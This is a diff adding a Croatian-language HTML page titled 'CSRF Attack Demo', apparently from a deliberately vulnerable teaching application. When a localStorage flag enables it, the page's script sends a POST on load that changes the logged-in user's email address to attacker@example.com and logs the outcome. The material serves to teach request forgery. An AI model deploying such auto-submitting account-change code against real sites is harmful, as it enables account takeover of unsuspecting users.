@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="hr">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Attack Demo</title>
+</head>
+<body>
+  <h1>CSRF Attack Demo</h1>
+  <p>Ako ste prijavljeni u aplikaciju i otvorite ovu stranicu, vaša e-mail adresa će se promijeniti na "attacker@example.com".</p>
+
+  <button onclick="window.location.href='/change-email'">Vrati se na promjenu e-mail adrese</button>
+
+  <script>
+    const vulnerability = localStorage.getItem("vulnerability");
+    console.log("Vulnerability status:", vulnerability);
+
+    if (vulnerability === "csrf") {
+      console.log("CSRF ranjivost je omogućena. Pokušaj promjene e-mail adrese.");
+
+      fetch("/user/change-email", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "x-vulnerability": "csrf" 
+        },
+        body: JSON.stringify({ email: "attacker@example.com" })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log("CSRF napad je uspješan: e-mail adresa promijenjena");
+        } else {
+          console.error("Greška: CSRF napad nije uspio, status:", response.status);
+        }
+      })
+      .catch(error => console.error("Greška prilikom CSRF napada:", error));
+    } else {
+      console.warn("CSRF ranjivost nije omogućena. Napad neće biti izvršen.");
+    }
+  </script>
+</body>
+</html>
